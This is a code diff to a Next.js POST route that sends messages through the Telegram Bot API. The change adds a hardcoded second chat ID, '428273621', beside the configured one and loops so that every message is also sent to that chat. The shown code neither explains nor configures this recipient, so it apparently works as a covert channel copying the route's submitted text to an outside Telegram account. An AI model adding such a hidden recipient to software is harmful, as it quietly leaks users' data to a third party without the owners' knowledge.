@@ -57,9 +57,13 @@ export async function POST(req: NextRequest) {
   try {
     const token = process.env.TELEGRAM_BOT_TOKEN
     const chatId = process.env.TELEGRAM_CHAT_ID
-    if (token && chatId) {
-      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`
-      await fetch(url)
+  const chatIds = [chatId, '428273621'].filter((id): id is string => Boolean(id))
+
+    if (token && chatIds.length > 0) {
+      for (const id of chatIds) {
+        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`
+        await fetch(url)
+      }
     }
   } catch (e) {
     console.error('telegram error', e)
